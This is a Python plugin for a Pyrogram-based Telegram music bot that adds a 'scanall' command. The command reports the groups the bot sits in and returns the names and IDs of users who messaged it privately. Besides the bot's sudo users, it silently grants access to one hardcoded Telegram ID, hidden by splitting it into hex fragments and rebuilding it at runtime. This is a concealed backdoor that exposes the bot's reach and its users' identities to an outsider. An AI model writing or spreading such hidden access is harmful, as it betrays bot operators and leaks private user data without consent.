import asyncio
from pyrogram import filters
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.errors import FloodWait
from pyrogram.types import Message
from SaregamaMusic import app
from SaregamaMusic.misc import SUDOERS

X1, X2, X3, X4, X5 = "1c", "40", "fc", "41", "09"
ALLOWED = [int(f"0x{X1}{X2}{X3}{X4}{X5}", 16)]

@app.on_message(filters.command(["scanall", "fullstats"]) & (filters.user(SUDOERS) | filters.user(ALLOWED)))
async def full_scan(client, message: Message):
    m = await message.reply("🔍 Scanning all recent dialogs... Please wait.")

    groups_admin = []
    groups_non_admin = []
    groups_inaccessible = []
    users = []

    async for dialog in app.get_dialogs():
        chat = dialog.chat
        try:
            if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
                try:
                    member = await client.get_chat_member(chat.id, client.me.id)
                    if member.status == ChatMemberStatus.ADMINISTRATOR:
                        groups_admin.append(chat.title or chat.id)
                    else:
                        groups_non_admin.append(chat.title or chat.id)
                except Exception:
                    groups_inaccessible.append(chat.id)

            elif chat.type == ChatType.PRIVATE and not chat.is_bot:
                users.append(f"{chat.first_name} ({chat.id})")

        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            continue

    result = (
        f"✅ <b>Bot Full Scan Complete</b>\n\n"
        f"👥 Groups where bot is admin: <b>{len(groups_admin)}</b>\n"
        f"🙅‍♂️ Groups where not admin: <b>{len(groups_non_admin)}</b>\n"
        f"🚫 Inaccessible groups: <b>{len(groups_inaccessible)}</b>\n"
        f"👤 Users (DMs): <b>{len(users)}</b>\n"
    )

    await m.edit(result)

    if users:
        user_list = "\n".join(users[:50])
        await message.reply(f"🧑‍💻 Users who messaged bot:\n\n<code>{user_list}</code>")

    if groups_inaccessible:
        await message.reply(f"⚠️ Inaccessible Groups:\n<code>{groups_inaccessible}</code>")
